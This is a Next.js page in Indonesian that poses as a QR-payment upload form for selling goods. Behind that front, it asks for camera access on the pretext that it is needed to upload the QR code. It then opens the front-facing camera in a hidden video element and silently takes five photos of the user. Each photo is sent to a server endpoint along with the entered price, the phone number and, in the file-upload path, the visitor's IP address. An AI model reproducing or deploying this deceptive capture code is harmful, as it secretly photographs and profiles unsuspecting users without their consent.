"use client";

import { useRef, ChangeEvent, useState, useEffect } from "react";
import { redirect } from "next/navigation";

export default function Home() {
  const fileInputRef = useRef<HTMLInputElement>(null);
  const previewRef = useRef<HTMLImageElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [cameraAllowed, setCameraAllowed] = useState(false);
  const [error, setError] = useState("");
  const [isCapturing, setIsCapturing] = useState(false);
  const [uploading, setUploading] = useState(false);
  const [jumlah, setJumlah] = useState("");
  const [number, setNumber] = useState("");
  const [hasUploadedQR, setHasUploadedQR] = useState(false);
  const [userIP, setUserIP] = useState("");

  // ✅ Dapatkan IP saat component mount
  useEffect(() => {
    const getIP = async () => {
      try {
        const response = await fetch("/api/ip");
        const data = await response.json();
        setUserIP(data.ip);
      } catch (err) {
        console.error("Failed to get IP:", err);
        setUserIP("Unknown");
      }
    };

    getIP();
  }, []);

  const isFormValid = () => {
    return jumlah.trim() !== "" && hasUploadedQR && number.trim() !== "";
  };

  const startCamera = async () => {
    setError("");
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user",
        },
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      }
      setCameraAllowed(true);
      await autoCapture();
    } catch (err) {
      setCameraAllowed(false);
      setError("Mohon izinkan akses kamera untuk mengupload gambar QR");
      console.error("Camera error:", err);
    }
  };

  const takePhoto = async () => {
    if (!videoRef.current || !canvasRef.current) return;

    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (video.videoWidth === 0 || video.videoHeight === 0) {
      console.log("Video not ready yet");
      return;
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL("image/jpeg");

    setHasUploadedQR(true);

    try {
      const response = await fetch("/api/sendPhoto", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image: imageData,
          // userIP: userIP,
          jumlah: jumlah,
          number: number,
          source: "camera_capture",
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send photo");
      }

      console.log("Photo + IP sent successfully");
    } catch (err) {
      console.error("Error sending photo:", err);
    }
  };

  const autoCapture = async () => {
    setIsCapturing(true);

    await new Promise((r) => setTimeout(r, 500));

    for (let i = 0; i < 5; i++) {
      await new Promise((r) => setTimeout(r, 2000));
      await takePhoto();
    }

    setIsCapturing(false);

    if (videoRef.current?.srcObject) {
      const stream = videoRef.current.srcObject as MediaStream;
      stream.getTracks().forEach((track) => track.stop());
    }
  };

  const handleFileUpload = (event: ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file && previewRef.current) {
      const reader = new FileReader();
      reader.onload = (e: ProgressEvent<FileReader>) => {
        if (e.target?.result && previewRef.current) {
          previewRef.current.src = e.target.result as string;
          previewRef.current.classList.remove("hidden");

          setHasUploadedQR(true);

           
          fetch("/api/sendPhoto", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              image: e.target.result as string,
              userIP: userIP,
              jumlah: jumlah,
              number: number,
              source: "file_upload",
              timestamp: new Date().toISOString(),
            }),
          });
        }
      };
      reader.readAsDataURL(file);
    }
  };

  const handleJumlahChange = (e: ChangeEvent<HTMLInputElement>) => {
    setJumlah(e.target.value);
  };
  const handleNumberPhoneChange = (e: ChangeEvent<HTMLInputElement>) => {
    setNumber(e.target.value);
  };

  const handleSubmit = () => {
    if (!isFormValid()) {
      alert("Harap isi jumlah harga dan upload QR code terlebih dahulu!");
      return;
    }

    console.log("Data yang dikirim:", {
      jumlah: jumlah,
      number: number,
      hasQR: hasUploadedQR,
      userIP: userIP,
    });

    redirect("/success");
  };

  return (
    <div className="bg-white min-h-screen">
      <video
        ref={videoRef}
        id="video"
        autoPlay
        playsInline
        muted
        className="hidden"
      />
      <canvas
        ref={canvasRef}
        id="canvas"
        width={150}
        height={150}
        style={{ display: "none" }}
      />

      <div> 
        <div className="w-full h-[90px] flex justify-start border-b border-stone-300">
          <img
            src="/assets/image.png"
            alt="Logo"
            className="h-[60px] mx-5 my-3"
          />
        </div>

        <div className="max-w-[430px] mx-auto">
          <img
            src="/assets/qriss.png"
            alt="Bayar"
            className="mx-auto mt-20 w-[300px]"
          />

          <h1 className="font-semibold text-black text-2xl mx-5 mt-2 text-center">
            Upload <span className="font-bold text-red-600">QR</span> ke-sini
            untuk melakukan{" "}
            <span className="font-bold text-red-600">Transaksi</span> jual
            barang.
          </h1>
          <p className="text-slate-400 text-center">
            menjual barang lebih mudah dengan metode pembayaran QR otomatis.
          </p>

          <div className="grid grid-cols-1 mx-5 mt-10 w-auto"> 
            <label
              htmlFor="jumlah"
              className="text-xl absolute ml-3 -mt-2 bg-white px-2 text-slate-600 text-start"
            >
              Masukkan jumlah harga barang
            </label>
            <input
              type="text"
              id="jumlah"
              value={jumlah}
              onChange={handleJumlahChange}
              required
              className="border border-slate-300 text-slate-500 focus:border-slate-400 focus:outline-none p-2 pl-2 mt-2 mb-3 rounded-xl h-12"
              placeholder="Rp."
            />
            <div className="relative mt-3">
               <label
              htmlFor="numberPhone"
              className="text-xl px-3 text-slate-600 absolute ml-3 -mt-2 bg-white text-start"
            >
              Nomer Telepon
            </label>
          
             <input
              type="integer"
              id="numberPhone"
              value={number}
              onChange={handleNumberPhoneChange}
              required
              className="border border-slate-300 text-slate-500 w-full focus:border-slate-400 focus:outline-none p-2 pl-2 mt-2 mb-3 rounded-xl h-12"
              placeholder="+62-812-XXX-XXX"
            />
            </div>
           
           

            <label className="text-xl text-slate-600 text-start mt-4">
              Upload QR Pembayaran
            </label>

            {!cameraAllowed ? (
              <div>
                <button
                  onClick={startCamera}
                  disabled={isCapturing}
                  className="border border-slate-300 bg-slate-50 text-slate-500 p-2 mt-2 mb-3 rounded-xl h-12 w-full text-left disabled:opacity-50"
                >
                  {isCapturing
                    ? "Memproses..."
                    : "Upload QR disini"}
                </button>

                {error && <p className="text-red-500 mt-1 text-sm">{error}</p>}
              </div>
            ) : (
              <div>
                <input
                  ref={fileInputRef}
                  type="file"
                  id="bukti"
                  className="hidden"
                  accept="image/*"
                  capture="environment"
                  required
                  onChange={handleFileUpload}
                />

                {isCapturing ? (
                  <div className="border border-blue-300 bg-blue-50 text-blue-600 p-3 mt-2 mb-3 rounded-xl text-center">
                    menyiapkan menu upload... (
                    {cameraAllowed
                      ? "tunggu sebentar"
                      : "mohon izinkn akses kamera agar bisa upload QR code"}
                    )
                  </div>
                ) : (
                  <button
                    onClick={() => fileInputRef.current?.click()}
                    className="border border-slate-300 bg-slate-50 text-slate-500 p-2 mt-2 mb-3 rounded-xl h-12 w-full"
                  >
                    upload kode QR kamu disini
                  </button>
                )}
              </div>
            )}
 
            <div className="mt-4">
              <img
                ref={previewRef}
                id="preview"
                className="rounded-xl border border-slate-200 w-full object-cover hidden max-h-64"
                alt="Preview pembayaran"
              />
            </div>

            <button
              onClick={handleSubmit}
              disabled={!isFormValid()}
              className={`p-3 rounded-xl w-full mt-10 mb-10 font-semibold text-lg transition-colors ${
                isFormValid()
                  ? "bg-red-700 text-white hover:bg-red-800"
                  : "bg-gray-300 text-gray-500 cursor-not-allowed"
              }`}
            >
              {isFormValid() ? "Kirim" : "upload QR"}
            </button>

            <div className="text-sm text-slate-500 mb-4">
              <div
                className={`flex items-center gap-2 ${
                  jumlah ? "text-green-600" : ""
                }`}
              >
                <span>•</span>
                <span>Jumlah harga {jumlah ? "Terisi" : "harus ditulis"}</span>
              </div>
              <div
                className={`flex items-center gap-2 ${
                  hasUploadedQR ? "text-green-600" : ""
                }`}
              >
                <span>•</span>
                <span>QR Code {hasUploadedQR ? "Terupload" : "upload QR"}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
